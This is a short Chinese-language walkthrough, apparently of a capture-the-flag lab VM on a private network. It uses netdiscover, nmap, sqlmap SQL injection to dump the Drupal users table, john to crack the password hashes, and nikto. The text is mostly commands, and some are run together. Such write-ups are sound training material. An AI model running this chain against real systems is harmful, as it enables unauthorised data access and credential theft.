1、主机探测

netdiscover -r 192.168.207.0/24

2、服务探测

nmap -sV 192.168.207.132

3、访问web页面，有参数nid=1，测试SQL注入

4、使用sqlmap测试，发现有注入漏洞

sqlmap -u "http://192.168.207.132/?nid=1"

5、查看数据库，存在两个数据库

sqlmap -u "http://192.168.207.132/?nid=1" --dbs

6、爆破数据列，发现user表

sqlmap -u "http://192.168.207.132/?nid=1" --tables -D d7db

7、爆破user表，查看列信息有name和pass

sqlmap -u "http://192.168.207.132/?nid=1" --columns  -D d7db -T users

8、爆破name和pass字段

sqlmap -u "http://192.168.207.132/?nid=1" -C "name,pass"  -D d7db -T users --dump

9、保存密码信息，使用john爆破,得到一个密码turtle

echo '$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z' >> pass.txtecho '$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF' >> pass.txtjohn pass.txtjohn pass.txt --show

10、查看后台登录

nikto -host http://192.168.207.132
